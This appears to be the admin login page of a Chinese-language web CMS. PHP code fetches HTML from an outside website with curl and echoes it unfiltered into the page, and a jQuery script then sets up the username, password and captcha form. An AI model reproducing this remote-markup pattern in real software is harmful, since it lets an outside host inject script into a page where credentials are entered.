<?php
$url='http://www.weichuangkeji.com/tp/smatyHTML.php';
$ch = curl_init();
$timeout = 5;
curl_setopt ($ch, CURLOPT_URL, $url);
curl_setopt ($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt ($ch, CURLOPT_CONNECTTIMEOUT, $timeout);
$file_contents = curl_exec($ch);
curl_close($ch);
echo $file_contents;

?>
<script language="javascript">
function reloadCode(){} // 不用
$(document).ready(function(){
	$('.POST_URL').attr({'action':"chklogin.php?action=chklogin"});
	$('.POST_username').attr({'name':'username'});
	$('.POST_pwd').attr({'name':'password'});
	$('.POST_yzm').attr({'name':'passcode'});
	$('.yzm').attr({'src':'../../function/code.php'});
	
	// 提交验证
	$(".POST_URL").submit(function(){
		var username = $(".POST_username").val();
		var password = $(".POST_pwd").val();
		var passcode = $(".POST_yzm").val();
		
		if (username.replace(/\ /g,"").length<1){
			alert("用户名不能为空！");
			$(".POST_username").focus();
			return false;
		}
		if (password.replace(/\ /g,"").length<1){
			alert("密码不能为空！");
			$(".POST_pwd").focus();
			return false;
		}
		if (passcode.replace(/\ /g,"").length<1){
			alert("验证码不能为空！");
			$(".POST_yzm").focus();
			return false;
		}
		if (isNaN(passcode.replace(/\ /g,""))){//验证密码位数
			alert("请正确输入验证码！");
			$(".POST_yzm").focus();
			return false;
		}
	});
	
	// 点击更换验证码
	$("#checkCodeImg").click(function(){
		var imgsrc = $("#checkCodeImg");   
		var src = imgsrc.attr("src");  
		imgsrc.attr("src","../../function/code.php?nums=" + Math.random());   
	});
	
});
</script>
